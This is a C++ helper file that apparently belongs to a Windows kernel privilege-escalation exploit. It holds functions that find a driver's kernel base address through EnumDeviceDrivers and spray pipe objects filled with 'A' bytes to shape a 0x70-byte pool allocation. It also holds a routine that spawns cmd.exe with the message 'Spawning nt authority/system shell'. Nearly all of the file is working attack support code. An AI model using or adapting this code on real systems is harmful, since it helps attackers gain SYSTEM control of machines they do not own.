#include "utils.hpp"

void Error(const char* msg)
{
	printf("[-] Error %s\r\n", msg);
    Sleep(5);
	exit(EXIT_FAILURE);
}

DWORD64 GetModuleBase(LPCWSTR drvName)
{
    LPVOID pDrivers[512];
    DWORD cbNeeded;
    DWORD dwDrivers, i = 0;
    if (EnumDeviceDrivers(pDrivers, sizeof(pDrivers), &cbNeeded) && cbNeeded < sizeof(pDrivers))
    {
        WCHAR szDrivers[512];
        dwDrivers = cbNeeded / sizeof(pDrivers[0]);
        for (i = 0; i < dwDrivers; i++) 
        {
            if (GetDeviceDriverBaseName(pDrivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
            {
                if (wcscmp(szDrivers, drvName) == 0) 
                {
                    return (DWORD64)pDrivers[i];
                }
            }
        }
    }
    return 0;
}


PIPE_HANDLES CreatePipeObject()
{
    DWORD ALLOC_SIZE = 0x70;
    BYTE uBuffer[0x28];				// ALLOC_SIZE - HEADER_SIZE (0x48)
    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    DWORD dwRet;

    RtlFillMemory(uBuffer, 0x28, 0x41);
    if (!CreatePipe(&hReadPipe, &hWritePipe, NULL, 0x1000))
    {
        Error("CreatePipe");
    }

    if (!WriteFile(hWritePipe, uBuffer, sizeof(uBuffer), &dwRet, NULL))
    {
        Error("WriteFile");
    }
    return PIPE_HANDLES{ hReadPipe, hWritePipe };
}

VOID SpawnShell()
{

    wprintf(L"[+] Spawning nt authority/system shell...\r\n");

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(si));

    CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        0,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi);
}